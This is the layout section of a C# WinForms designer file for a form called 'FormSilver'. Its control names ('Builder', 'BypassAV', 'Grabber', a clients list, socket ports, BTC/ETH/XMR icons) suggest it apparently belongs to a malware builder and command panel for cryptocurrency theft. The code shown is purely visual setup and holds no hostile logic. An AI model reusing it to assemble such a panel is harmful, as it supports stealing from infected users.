        this.PanelLeft.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelLeft.BorderColor = System.Drawing.Color.White;
        this.PanelLeft.BorderRadius = 30;
        this.PanelLeft.BorderThickness = 1;
        this.PanelLeft.Location = new System.Drawing.Point(-16, 180);
        this.PanelLeft.Name = "PanelLeft";
        this.PanelLeft.ShowBorders = false;
        this.PanelLeft.Size = new System.Drawing.Size(25, 271);
        this.PanelLeft.TabIndex = 593;
        // 
        // PanelTOP
        // 
        this.PanelTOP.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left)
        | System.Windows.Forms.AnchorStyles.Right)));
        this.PanelTOP.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelTOP.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("PanelTOP.BackgroundImage")));
        this.PanelTOP.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelTOP.BorderColor = System.Drawing.Color.White;
        this.PanelTOP.BorderRadius = 30;
        this.PanelTOP.BorderThickness = 1;
        this.PanelTOP.Location = new System.Drawing.Point(331, -14);
        this.PanelTOP.Name = "PanelTOP";
        this.PanelTOP.ShowBorders = false;
        this.PanelTOP.Size = new System.Drawing.Size(331, 23);
        this.PanelTOP.TabIndex = 592;
        // 
        // PanelRight
        // 
        this.PanelRight.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)
        | System.Windows.Forms.AnchorStyles.Right)));
        this.PanelRight.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelRight.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("PanelRight.BackgroundImage")));
        this.PanelRight.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelRight.BorderColor = System.Drawing.Color.White;
        this.PanelRight.BorderRadius = 30;
        this.PanelRight.BorderThickness = 1;
        this.PanelRight.Location = new System.Drawing.Point(1019, 180);
        this.PanelRight.Name = "PanelRight";
        this.PanelRight.ShowBorders = false;
        this.PanelRight.Size = new System.Drawing.Size(25, 271);
        this.PanelRight.TabIndex = 591;
        // 
        // pictureBox2
        // 
        this.pictureBox2.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox2.Image")));
        this.pictureBox2.Location = new System.Drawing.Point(16, 3);
        this.pictureBox2.Name = "pictureBox2";
        this.pictureBox2.Size = new System.Drawing.Size(67, 96);
        this.pictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
        this.pictureBox2.TabIndex = 608;
        this.pictureBox2.TabStop = false;
        // 
        // FormDragMine
        // 
        this.FormDragMine.AllowOpacityChangesWhileDragging = false;
        this.FormDragMine.ContainerControl = this;
        this.FormDragMine.DockIndicatorsOpacity = 0.5D;
        this.FormDragMine.DockingIndicatorsColor = System.Drawing.Color.FromArgb(((int)(((byte)(202)))), ((int)(((byte)(215)))), ((int)(((byte)(233)))));
        this.FormDragMine.DockingOptions.DockAll = true;
        this.FormDragMine.DockingOptions.DockBottomLeft = true;
        this.FormDragMine.DockingOptions.DockBottomRight = true;
        this.FormDragMine.DockingOptions.DockFullScreen = true;
        this.FormDragMine.DockingOptions.DockLeft = true;
        this.FormDragMine.DockingOptions.DockRight = true;
        this.FormDragMine.DockingOptions.DockTopLeft = true;
        this.FormDragMine.DockingOptions.DockTopRight = true;
        this.FormDragMine.DragOpacity = 0.9D;
        this.FormDragMine.Enabled = true;
        this.FormDragMine.ParentForm = this;
        this.FormDragMine.ShowCursorChanges = true;
        this.FormDragMine.ShowDockingIndicators = true;
        this.FormDragMine.TitleBarOptions.BunifuFormDrag = this.FormDragMine;
        this.FormDragMine.TitleBarOptions.DoubleClickToExpandWindow = true;
        this.FormDragMine.TitleBarOptions.Enabled = true;
        this.FormDragMine.TitleBarOptions.TitleBarControl = this.panelForm;
        this.FormDragMine.TitleBarOptions.UseBackColorOnDockingIndicators = false;
        // 
        // PanelFormElipse
        // 
        this.PanelFormElipse.ElipseRadius = 40;
        this.PanelFormElipse.TargetControl = this.panelForm;
        // 
        // TransitionShowng
        // 
        this.TransitionShowng.AnimationType = Utilities.BunifuPages.BunifuAnimatorNS.AnimationType.Custom;
        this.TransitionShowng.Cursor = null;
        animation3.AnimateOnlyDifferences = true;
        animation3.BlindCoeff = ((System.Drawing.PointF)(resources.GetObject("animation3.BlindCoeff")));
        animation3.LeafCoeff = 0F;
        animation3.MaxTime = 1F;
        animation3.MinTime = 0F;
        animation3.MosaicCoeff = ((System.Drawing.PointF)(resources.GetObject("animation3.MosaicCoeff")));
        animation3.MosaicShift = ((System.Drawing.PointF)(resources.GetObject("animation3.MosaicShift")));
        animation3.MosaicSize = 0;
        animation3.Padding = new System.Windows.Forms.Padding(0);
        animation3.RotateCoeff = 0F;
        animation3.RotateLimit = 0F;
        animation3.ScaleCoeff = ((System.Drawing.PointF)(resources.GetObject("animation3.ScaleCoeff")));
        animation3.SlideCoeff = ((System.Drawing.PointF)(resources.GetObject("animation3.SlideCoeff")));
        animation3.TimeCoeff = 0F;
        animation3.TransparencyCoeff = 0F;
        this.TransitionShowng.DefaultAnimation = animation3;
        // 
        // TransitionHiddeng
        // 
        this.TransitionHiddeng.AnimationType = Utilities.BunifuPages.BunifuAnimatorNS.AnimationType.Custom;
        this.TransitionHiddeng.Cursor = null;
        animation4.AnimateOnlyDifferences = true;
        animation4.BlindCoeff = ((System.Drawing.PointF)(resources.GetObject("animation4.BlindCoeff")));
        animation4.LeafCoeff = 0F;
        animation4.MaxTime = 1F;
        animation4.MinTime = 0F;
        animation4.MosaicCoeff = ((System.Drawing.PointF)(resources.GetObject("animation4.MosaicCoeff")));
        animation4.MosaicShift = ((System.Drawing.PointF)(resources.GetObject("animation4.MosaicShift")));
        animation4.MosaicSize = 0;
        animation4.Padding = new System.Windows.Forms.Padding(0);
        animation4.RotateCoeff = 0F;
        animation4.RotateLimit = 0F;
        animation4.ScaleCoeff = ((System.Drawing.PointF)(resources.GetObject("animation4.ScaleCoeff")));
        animation4.SlideCoeff = ((System.Drawing.PointF)(resources.GetObject("animation4.SlideCoeff")));
        animation4.TimeCoeff = 0F;
        animation4.TransparencyCoeff = 0F;
        this.TransitionHiddeng.DefaultAnimation = animation4;
        // 
        // IconLogs
        // 
        this.IconLogs.ImageStream = ((System.Windows.Forms.ImageListStreamer)(resources.GetObject("IconLogs.ImageStream")));
        this.IconLogs.TransparentColor = System.Drawing.Color.Transparent;
        this.IconLogs.Images.SetKeyName(0, "ErrorNotif.png");
        this.IconLogs.Images.SetKeyName(1, "InfoNotif.png");
        this.IconLogs.Images.SetKeyName(2, "SuccessNotif.png");
        this.IconLogs.Images.SetKeyName(3, "BTC.png");
        this.IconLogs.Images.SetKeyName(4, "ETH.png");
        this.IconLogs.Images.SetKeyName(5, "XMR.png");
        // 
        // Flag
        // 
        this.Flag.ColorDepth = System.Windows.Forms.ColorDepth.Depth8Bit;
        this.Flag.ImageSize = new System.Drawing.Size(24, 24);
        this.Flag.TransparentColor = System.Drawing.Color.Transparent;
        // 
        // TimerDashboard
        // 
        this.TimerDashboard.Interval = 500;
        this.TimerDashboard.Tick += new System.EventHandler(this.TimerDashboard_Tick);
        // 
        // bunifuTransition1
        // 
        this.bunifuTransition1.AnimationType = Utilities.BunifuPages.BunifuAnimatorNS.AnimationType.VertSlide;
        this.bunifuTransition1.Cursor = null;
        animation5.AnimateOnlyDifferences = true;
        animation5.BlindCoeff = ((System.Drawing.PointF)(resources.GetObject("animation5.BlindCoeff")));
        animation5.LeafCoeff = 0F;
        animation5.MaxTime = 1F;
        animation5.MinTime = 0F;
        animation5.MosaicCoeff = ((System.Drawing.PointF)(resources.GetObject("animation5.MosaicCoeff")));
        animation5.MosaicShift = ((System.Drawing.PointF)(resources.GetObject("animation5.MosaicShift")));
        animation5.MosaicSize = 0;
        animation5.Padding = new System.Windows.Forms.Padding(0);
        animation5.RotateCoeff = 0F;
        animation5.RotateLimit = 0F;
        animation5.ScaleCoeff = ((System.Drawing.PointF)(resources.GetObject("animation5.ScaleCoeff")));
        animation5.SlideCoeff = ((System.Drawing.PointF)(resources.GetObject("animation5.SlideCoeff")));
        animation5.TimeCoeff = 0F;
        animation5.TransparencyCoeff = 0F;
        this.bunifuTransition1.DefaultAnimation = animation5;
        // 
        // performanceCounter1
        // 
        this.performanceCounter1.CategoryName = "Processor";
        this.performanceCounter1.CounterName = "% Processor Time";
        this.performanceCounter1.InstanceName = "_Total";
        // 
        // performanceCounter2
        // 
        this.performanceCounter2.CategoryName = "Memory";
        this.performanceCounter2.CounterName = "% Committed Bytes In Use";
        // 
        // FormSilver
        // 
        this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
        this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
        this.BackColor = System.Drawing.Color.Gainsboro;
        this.ClientSize = new System.Drawing.Size(1029, 628);
        this.Controls.Add(this.panelForm);
        this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
        this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
        this.Name = "FormSilver";
        this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
        this.Text = "FormSilver";
        this.TransparencyKey = System.Drawing.Color.Gainsboro;
        this.Activated += new System.EventHandler(this.FormSilver_Activated);
        this.Deactivate += new System.EventHandler(this.FormSilver_Deactivate);
        this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.FormSilver_FormClosing);
        this.Load += new System.EventHandler(this.FormSilver_Load);
        this.Shown += new System.EventHandler(this.FormSilver_Shown);
        this.ResizeBegin += new System.EventHandler(this.FormSilver_ResizeBegin);
        this.ResizeEnd += new System.EventHandler(this.FormSilver_ResizeEnd);
        this.panelForm.ResumeLayout(false);
        this.MunePanelProfile.ResumeLayout(false);
        this.TabMune.ResumeLayout(false);
        this.tabPage1Builder.ResumeLayout(false);
        this.PanelMuneBuilder.ResumeLayout(false);
        this.PanelMuneBuilder.PerformLayout();
        this.PanelBrowserIcon.ResumeLayout(false);
        this.PanelAssemplyInfo.ResumeLayout(false);
        ((System.ComponentModel.ISupportInitialize)(this.ImageIcon)).EndInit();
        this.tabPage2Monitor.ResumeLayout(false);
        this.PanelMuneMonitor.ResumeLayout(false);
        this.PanelMuneMonitor.PerformLayout();
        ((System.ComponentModel.ISupportInitialize)(this.pictureBox11)).EndInit();
        this.PanelMonitorGrabber.ResumeLayout(false);
        this.PanelListScan.ResumeLayout(false);
        ((System.ComponentModel.ISupportInitialize)(this.ListScanActiveAddresses)).EndInit();
        this.tabPage3.ResumeLayout(false);
        this.PanelProfile.ResumeLayout(false);
        this.PanelProfile.PerformLayout();
        this.bunifuPanel19.ResumeLayout(false);
        this.bunifuPanel19.PerformLayout();
        ((System.ComponentModel.ISupportInitialize)(this.ImageMuneGood)).EndInit();
        ((System.ComponentModel.ISupportInitialize)(this.ImageMuneError)).EndInit();
        this.ImageProfileMune.ResumeLayout(false);
        this.PanelResizeForm.ResumeLayout(false);
        this.PageForm.ResumeLayout(false);
        this.Page1.ResumeLayout(false);
        this.PanelDashboard.ResumeLayout(false);
        this.bunifuGradientPanel2.ResumeLayout(false);
        this.bunifuGradientPanel2.PerformLayout();
        ((System.ComponentModel.ISupportInitialize)(this.ListDashboard)).EndInit();
        this.bunifuGradientPanel3.ResumeLayout(false);
        ((System.ComponentModel.ISupportInitialize)(this.pictureBox9)).EndInit();
        this.bunifuPanel5.ResumeLayout(false);
        this.bunifuPanel5.PerformLayout();
        this.bunifuPanel11.ResumeLayout(false);
        this.bunifuPanel11.PerformLayout();
        this.bunifuGradientPanel1.ResumeLayout(false);
        this.bunifuGradientPanel1.PerformLayout();
        ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox1)).EndInit();
        this.bunifuPanel4.ResumeLayout(false);
        this.bunifuPanel4.PerformLayout();
        this.bunifuPanel3.ResumeLayout(false);
        this.bunifuPanel3.PerformLayout();
        this.bunifuPanel2.ResumeLayout(false);
        this.bunifuPanel2.PerformLayout();
        this.bunifuPanel6.ResumeLayout(false);
        this.bunifuPanel6.PerformLayout();
        this.bunifuPanel1.ResumeLayout(false);
        this.bunifuPanel1.PerformLayout();
        ((System.ComponentModel.ISupportInitialize)(this.pictureBox8)).EndInit();
        this.Page2.ResumeLayout(false);
        this.PanelMonitor.ResumeLayout(false);
        this.bunifuShadowPanel3.ResumeLayout(false);
        this.bunifuShadowPanel3.PerformLayout();
        ((System.ComponentModel.ISupportInitialize)(this.LogsMonitor)).EndInit();
        this.Page3.ResumeLayout(false);
        this.PanelClients.ResumeLayout(false);
        this.PanelListClient.ResumeLayout(false);
        ((System.ComponentModel.ISupportInitialize)(this.ClientsList)).EndInit();
        this.ContexClients.ResumeLayout(false);
        this.Page4.ResumeLayout(false);
        this.PanelLogs.ResumeLayout(false);
        this.bunifuShadowPanel5.ResumeLayout(false);
        this.bunifuShadowPanel5.PerformLayout();
        ((System.ComponentModel.ISupportInitialize)(this.LogsList)).EndInit();
        this.Page5.ResumeLayout(false);
        this.PanelBuilder.ResumeLayout(false);
        this.bunifuShadowPanel1.ResumeLayout(false);
        this.bunifuShadowPanel1.PerformLayout();
        ((System.ComponentModel.ISupportInitialize)(this.pictureBox4)).EndInit();
        ((System.ComponentModel.ISupportInitialize)(this.ImageBypassAV)).EndInit();
        this.PanelDelay.ResumeLayout(false);
        this.PanelReDelay.ResumeLayout(false);
        this.PanelTask.ResumeLayout(false);
        ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
        this.InsPanel.ResumeLayout(false);
        this.InsPanel.PerformLayout();
        this.Page6.ResumeLayout(false);
        this.PanelSettings.ResumeLayout(false);
        this.bunifuShadowPanel4.ResumeLayout(false);
        this.bunifuShadowPanel4.PerformLayout();
        ((System.ComponentModel.ISupportInitialize)(this.pictureBox7)).EndInit();
        ((System.ComponentModel.ISupportInitialize)(this.pictureBox6)).EndInit();
        ((System.ComponentModel.ISupportInitialize)(this.pictureBox5)).EndInit();
        this.Page7.ResumeLayout(false);
        this.PanelAbout.ResumeLayout(false);
        ((System.ComponentModel.ISupportInitialize)(this.pictureBox3)).EndInit();
        this.PageSocketPort.ResumeLayout(false);
        this.PanelButtonPort.ResumeLayout(false);
        this.bunifuShadowPanel2.ResumeLayout(false);
        ((System.ComponentModel.ISupportInitialize)(this.ListSocketPort)).EndInit();
        this.PaneControll.ResumeLayout(false);
        ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).EndInit();
        ((System.ComponentModel.ISupportInitialize)(this.performanceCounter1)).EndInit();
        ((System.ComponentModel.ISupportInitialize)(this.performanceCounter2)).EndInit();
        this.ResumeLayout(false);

    }
}
